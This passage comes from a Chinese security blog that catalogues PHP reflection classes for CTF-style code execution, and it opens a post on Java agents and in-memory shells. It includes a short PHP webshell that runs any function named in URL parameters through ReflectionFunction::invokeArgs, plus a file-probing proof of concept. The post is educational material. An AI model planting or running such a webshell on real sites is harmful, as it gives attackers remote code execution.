class="title">new</span> <span class="title">ReflectionMethod</span>(&quot;<span class="title">class</span>?&quot;,&quot;<span class="title">method</span>?&quot;))-&gt;<span class="title">isInternal</span>() // 方法是否是内部函数</span></span><br><span class="line"><span class="class">(<span class="title">new</span> <span class="title">ReflectionMethod</span>(&quot;<span class="title">class</span>?&quot;,&quot;<span class="title">method</span>?&quot;))-&gt;<span class="title">isUserDefined</span>() // 方法是否是用户定义</span></span><br></pre></td></tr></table></figure></div>



<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>ReflectionMethod 类报告了一个方法的有关信息。ReflectionMethod 类中有很多继承方法可以使用，比如这个 <code>getDocComment()</code> 方法，我们可以用它来获取类中各个函数注释内容</p>
<p>example:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FlagIsHere</span><br><span class="line">&#123;</span><br><span class="line">  /**</span><br><span class="line">   * 这是测试方法</span><br><span class="line">   * flag&#123;success&#125;</span><br><span class="line">   * @return int</span><br><span class="line">   */</span><br><span class="line">  protected function GiveMeFlag()</span><br><span class="line">  &#123;</span><br><span class="line">    return 9999;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$ref = new ReflectionMethod(&#x27;FlagIsHere&#x27;,&#x27;GiveMeFlag&#x27;);</span><br><span class="line">var_dump($ref-&gt;getDocComment());</span><br></pre></td></tr></table></figure></div>

<p>输出：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/a-16935535067886.png"
                      alt="a"
                ></p>
<h3 id="ReflectionClass"><a href="#ReflectionClass" class="headerlink" title="ReflectionClass"></a>ReflectionClass</h3><h4 id="说明-1"><a href="#说明-1" class="headerlink" title="说明"></a>说明</h4><p>利用功能：<br>- 获取&#x2F;修改类中静态属性的值<br>- 获取类中属性的值<br>- 实例化新类<br>- 获取类信息</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取/修改类中静态属性的值</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">getStaticProperties</span>(); <span class="comment"># 获取静态属性</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">getStaticPropertyValue</span>(<span class="string">&quot;key?&quot;</span>,<span class="string">&quot;default_value?&quot;</span>); <span class="comment"># 获取指定静态属性的值，可以手动设置默认值</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">setStaticPropertyValue</span>(<span class="string">&quot;key?&quot;</span>,<span class="string">&quot;value?&quot;</span>); <span class="comment"># 设置静态属性的值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取类中属性的值</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">getProperties</span>(); <span class="comment"># 获取属性</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">getProperty</span>(<span class="string">&quot;key?&quot;</span>) <span class="comment"># 获取指定属性的值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化新类，</span></span><br><span class="line"><span class="comment"># 比如反射 phpinfo 函数</span></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;ReflectionFunction&#x27;</span>);</span><br><span class="line"><span class="variable">$iv</span> = <span class="variable">$c</span>-&gt;<span class="title function_ invoke__">newInstance</span>(<span class="string">&#x27;phpinfo&#x27;</span>);</span><br><span class="line"><span class="variable">$ia</span> = <span class="variable">$c</span>-&gt;<span class="title function_ invoke__">newInstanceArgs</span>(<span class="keyword">array</span>(<span class="string">&#x27;phpinfo&#x27;</span>));</span><br><span class="line"><span class="variable">$ie</span> = <span class="variable">$c</span>-&gt;<span class="title function_ invoke__">newInstanceWithoutConstructor</span>(); <span class="comment">// 调用一个类但不调用其 __construct 方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取类信息</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">export</span>(); <span class="comment">// 导出类</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">getConstant</span>(<span class="keyword">string</span> <span class="variable">$name</span>) <span class="comment">// 获取类中指定常量值</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">getConstants</span>(?<span class="keyword">int</span> <span class="variable">$filter</span> = <span class="literal">null</span>) <span class="comment">// 获取类中所有常量值</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">getConstructor</span>() <span class="comment">// 获取类中构造方法(__construct)作为反射方法返回</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">getDefaultProperties</span>() <span class="comment">// 获取类中默认属性</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">getDocComment</span>() <span class="comment">// 获取类的注释</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">getStartLine</span>() <span class="comment">// 获取类开始行号</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">getEndLine</span>() <span class="comment">// 获取类结束行号</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">getExtensionName</span>() <span class="comment">// 获取类的扩展名称</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">getFileName</span>() <span class="comment">// 获取类所在的文件名</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">getInterfaceNames</span>() <span class="comment">// 获取类的接口名称</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">getInterfaces</span>() <span class="comment">// 获取类的接口</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">getMethod</span>(<span class="keyword">string</span> <span class="variable">$name</span>) <span class="comment">// 获取类的指定方法作为反射方法返回</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">getMethods</span>() <span class="comment">// 获取类的方法</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">getModifiers</span>() <span class="comment">// 获取类的修饰符</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">getName</span>() <span class="comment">// 获取类名称</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">getNamespaceName</span>() <span class="comment">// 获取类所在命名空间名称</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">getParentClass</span>() <span class="comment">// 获取父类作为反射类返回</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">getReflectionConstant</span>() <span class="comment">// 获取类的指定常量作为反射类常量返回</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">getReflectionConstants</span>() <span class="comment">// 获取类的常量作为反射类常量数组返回</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">getShortName</span>() <span class="comment">// 获取类的短名</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">getTraitAliases</span>() <span class="comment">// 获取类所使用 trait 别名的数组</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">getTraitNames</span>() <span class="comment">// 获取类所使用 traits 名称的数组</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">getTraits</span>() <span class="comment">// 获取类所使用的 traits </span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">hasConstant</span>(<span class="keyword">string</span> <span class="variable">$name</span>) <span class="comment">// 类是否有指定的常量</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">hasMethod</span>(<span class="keyword">string</span> <span class="variable">$name</span>) <span class="comment">// 类是否有指定的方法</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">implementsInterface</span>(<span class="keyword">string</span> <span class="variable">$interface</span>) <span class="comment">// 类是否实现指定的接口</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">inNamespace</span>() <span class="comment">// 类是否在命名空间中</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">isAbstract</span>() <span class="comment">// 类是否是抽象类</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">isAnonymous</span>() <span class="comment">// 类是否是匿名类</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">isCloneable</span>() <span class="comment">// 类是否是可复制的</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">isFinal</span>() <span class="comment">// 类是否声明为 final</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">isInternal</span>() <span class="comment">// 类是否是内部的</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">isIterable</span>() <span class="comment">// 类是否是一个迭代类</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">isIterateable</span>() <span class="comment">// 类是否是可迭代的</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">isSubclassOf</span>(<span class="keyword">string</span> <span class="variable">$class</span>) <span class="comment">// 类是否是指定类的子类</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">isTrait</span>() <span class="comment">// 类是否是 trait</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;class?&quot;</span>))-&gt;<span class="title function_ invoke__">isUserDefined</span>() <span class="comment">// 类是否是用户定义的</span></span><br></pre></td></tr></table></figure></div>



<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><p>ReflectionClass 类报告了一个类的有关信息。其中初始化方法能够返回类的实例。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public ReflectionClass::__construct(mixed $argument)</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>$argument</code>：既可以是包含类名的字符串（string）也可以是对象（object）。</li>
</ul>
<p>用法如下</p>
<p>example：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/b.png"
                      alt="b"
                ></p>
<p>把类里面属性和方法的名字都能够显示出来。</p>
<h3 id="ReflectionFunction"><a href="#ReflectionFunction" class="headerlink" title="ReflectionFunction"></a>ReflectionFunction</h3><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>可以通过这个反射类拿到许多函数中的信息</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 反射调用函数</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&quot;func?&quot;</span>))-&gt;<span class="title function_ invoke__">invoke</span>(args);</span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&quot;func?&quot;</span>))-&gt;<span class="title function_ invoke__">invokeArgs</span>([args1,args2]);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取函数信息</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&quot;func?&quot;</span>))-&gt;<span class="title function_ invoke__">isDisabled</span>() <span class="comment">// 函数是否可用</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&quot;func?&quot;</span>))-&gt;<span class="title function_ invoke__">getClosure</span>() <span class="comment">// 获取该匿名函数</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&quot;func?&quot;</span>))-&gt;<span class="title function_ invoke__">getDocComment</span>() <span class="comment">// 获取函数注释内容</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&quot;func?&quot;</span>))-&gt;<span class="title function_ invoke__">getStartLine</span>() <span class="comment">// 获取函数开始行号</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&quot;func?&quot;</span>))-&gt;<span class="title function_ invoke__">getEndLine</span>() <span class="comment">// 获取函数结束行号</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&quot;func?&quot;</span>))-&gt;<span class="title function_ invoke__">getExtensionName</span>() <span class="comment">// 获取扩展名称</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&quot;func?&quot;</span>))-&gt;<span class="title function_ invoke__">getName</span>() <span class="comment">// 获取函数名称</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&quot;func?&quot;</span>))-&gt;<span class="title function_ invoke__">getNamespaceName</span>() <span class="comment">// 获取命名空间名称</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&quot;func?&quot;</span>))-&gt;<span class="title function_ invoke__">getNumberOfParameters</span>() <span class="comment">// 获取函数参数数量</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&quot;func?&quot;</span>))-&gt;<span class="title function_ invoke__">getNumberOfRequiredParameters</span>() <span class="comment">// 获取函数必须传入的参数数量</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&quot;func?&quot;</span>))-&gt;<span class="title function_ invoke__">getParameters</span>() <span class="comment">// 获取函数参数名</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&quot;func?&quot;</span>))-&gt;<span class="title function_ invoke__">getShortName</span>() <span class="comment">// 获取函数短名</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&quot;func?&quot;</span>))-&gt;<span class="title function_ invoke__">getStaticVariables</span>() <span class="comment">// 获取函数静态变量</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&quot;func?&quot;</span>))-&gt;<span class="title function_ invoke__">hasReturnType</span>() <span class="comment">// 函数是否有特定返回类型</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&quot;func?&quot;</span>))-&gt;<span class="title function_ invoke__">inNamespace</span>() <span class="comment">// 函数是否定义在命名空间</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&quot;func?&quot;</span>))-&gt;<span class="title function_ invoke__">isClosure</span>() <span class="comment">// 函数是否是匿名函数</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&quot;func?&quot;</span>))-&gt;<span class="title function_ invoke__">isDeprecated</span>() <span class="comment">// 函数是否弃用</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&quot;func?&quot;</span>))-&gt;<span class="title function_ invoke__">isGenerator</span>() <span class="comment">// 函数是否是生成器函数</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&quot;func?&quot;</span>))-&gt;<span class="title function_ invoke__">isInternal</span>() <span class="comment">// 函数是否是内部函数</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&quot;func?&quot;</span>))-&gt;<span class="title function_ invoke__">isUserDefined</span>() <span class="comment">// 函数是否是用户定义</span></span><br></pre></td></tr></table></figure></div>



<h4 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h4><p><strong>ReflectionFunction</strong> 类报告了一个函数的有关信息。其中<code>invokeArgs()</code>方法能够用来写Webshell。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public ReflectionFunction::invokeArgs(array $args): mixed</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>$args</code>：传递给函数的参数是一个数组，像<code>call_user_func_array()</code>的工作方式。</li>
</ul>
<p>example:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function title($title, $name)</span><br><span class="line">&#123;</span><br><span class="line">    return sprintf(&quot;%s. %s\r\n&quot;, $title, $name);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$function = new ReflectionFunction(&#x27;title&#x27;);</span><br><span class="line"> </span><br><span class="line">echo $function-&gt;invokeArgs(array(&#x27;Dr&#x27;, &#x27;Phil&#x27;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/c.png"
                      alt="c"
                ></p>
<p>我们可以使用这个方法来写Webshell：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $func = new ReflectionFunction($_GET[m]);</span><br><span class="line">    echo $func-&gt;invokeArgs(array($_GET[c]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/d.png"
                      alt="d"
                ></p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="IntlChar"><a href="#IntlChar" class="headerlink" title="IntlChar"></a>IntlChar</h3><p>可以取代<code>ord</code>，<code>chr</code>等函数</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ord 和 chr 函数</span></span><br><span class="line"><span class="title class_">IntlChar</span>::<span class="title function_ invoke__">ord</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title class_">IntlChar</span>::<span class="title function_ invoke__">chr</span>(<span class="number">97</span>);</span><br></pre></td></tr></table></figure></div>



<h3 id="finfo"><a href="#finfo" class="headerlink" title="finfo"></a>finfo</h3><h3 id="判断文件是否存在-判断文件类型-poc"><a href="#判断文件是否存在-判断文件类型-poc" class="headerlink" title="判断文件是否存在(判断文件类型)poc"></a>判断文件是否存在(判断文件类型)poc</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$f = &quot;./aasd.php&quot;;</span><br><span class="line">$ff = new finfo(FILEINFO_MIME);</span><br><span class="line">echo $ff-&gt;file($f);</span><br></pre></td></tr></table></figure></div>





<h2 id="原生类反序列化利用"><a href="#原生类反序列化利用" class="headerlink" title="原生类反序列化利用"></a>原生类反序列化利用</h2>]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>从 agent 到内存马</title>
    <url>/2024/03/13/blog_%E4%BB%8EAgent%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[
  <div class="note p-4 mb-4 rounded-small primary">
    <p>之前学 java agant 内存马之后太久没看又给忘了，最近刚好有些内容需要 agent，索性复习一下。</p>
<p>代码同步在了 <a class="link"   href="https://github.com/Ko1sh1/Agent2Mem" >https://github.com/Ko1sh1/Agent2Mem <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>

  </div>



<h3 id="premain-启动时加载-agent"><a href="#premain-启动时加载-agent" class="headerlink" title="premain-启动时加载 agent"></a>premain-启动时加载 agent</h3><h4 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h4><p>可在命令行利用 <strong>-javaagent</strong> 来实现启动时加载</p>
<p>主要是通过写 premain 函数并在 MANIFEST 中指定 Premain-Class 来在启动另外的类前，先加载 premain 类，懒得创建文件再去编译写 jar 文件了，这里我个简单的一键生成测试 jar 包的脚本</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.Attributes;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarEntry;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.Manifest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">_SimpleExampleMaker</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">// 创建一个 premain 和需要 被代理的类，具体函数实现请修改 makeClassWithMethod 的第一个参数</span></span><br><span class="line">        Class&lt;?&gt; testClass = makeClassWithMethod(<span class="string">&quot;TestClass&quot;</span>,</span><br><span class="line">                <span class="string">&quot;public static void main(String[] args) &#123; System.out.println(\&quot;Main class Running\&quot;); &#125;&quot;</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; premainDemo = makeClassWithMethod(<span class="string">&quot;PremainDemo&quot;</span>,</span><br><span class="line">                <span class="string">&quot;public static void premain(String agentArgs, java.lang.instrument.Instrumentation inst) throws Exception &#123;System.out.println(agentArgs.isEmpty() ? \&quot;null\&quot; : agentArgs);System.out.println(\&quot;premain method is invoked!\&quot;);&#125;&quot;</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">//  创建两个类的jar文件</span></span><br><span class="line">        makePremainJar(premainDemo,<span class="string">&quot;agent.jar&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">        makePremainJar(testClass,<span class="string">&quot;demo.jar&quot;</span>,<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 写好后执行下面的内容：</span></span><br><span class="line">        <span class="comment">// java -javaagent:agent.jar[=options] -jar demo.jar</span></span><br><span class="line">        <span class="comment">// 例如: java -javaagent:agent.jar=koishi -jar demo.jar</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; makeClassWithMethod(String className, String methodBody) <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(className);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> CtNewMethod.make(methodBody, ctClass);</span><br><span class="line">        ctClass.addMethod(ctMethod);</span><br><span class="line">        ctClass.writeFile(<span class="string">&quot;premain/src/main/java/javas&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ctClass.toClass();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">makePremainJar</span><span class="params">(Class compileClass, String jarName, <span class="type">boolean</span> is_premain)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jarFilePath</span> <span class="operator">=</span> <span class="string">&quot;premain/src/main/java/jars/&quot;</span> + jarName;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> compileClass.getName() + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 Manifest 并设置内容</span></span><br><span class="line">        <span class="type">Manifest</span> <span class="variable">manifest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Manifest</span>();</span><br><span class="line">        manifest.getMainAttributes().put(Attributes.Name.MANIFEST_VERSION, <span class="string">&quot;1.0&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (is_premain) &#123;</span><br><span class="line">            manifest.getMainAttributes().put(<span class="keyword">new</span> <span class="title class_">Attributes</span>.Name(<span class="string">&quot;Premain-Class&quot;</span>), compileClass.getName());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            manifest.getMainAttributes().put(Attributes.Name.MAIN_CLASS, compileClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将 class 和  Manifest 写入 jar 文件</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(jarFilePath);</span><br><span class="line">             <span class="type">JarOutputStream</span> <span class="variable">jos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JarOutputStream</span>(fos, manifest)) &#123;</span><br><span class="line">            jos.putNextEntry(<span class="keyword">new</span> <span class="title class_">JarEntry</span>(className));</span><br><span class="line">            <span class="type">byte</span>[] bytes = pool.get(compileClass.getName()).toBytecode();</span><br><span class="line">            jos.write(bytes);</span><br><span class="line">            jos.closeEntry();</span><br><span class="line">            System.out.println(<span class="string">&quot;JAR file created successfully!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>运行上面的 java 代码后在 jars 目录下执行下面的内容：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -javaagent:agent.jar[=options] -jar demo.jar</span><br><span class="line">java -javaagent:agent.jar=koishi -jar demo.jar</span><br></pre></td></tr></table></figure></div>

<p>会发现输入以下内容</p>
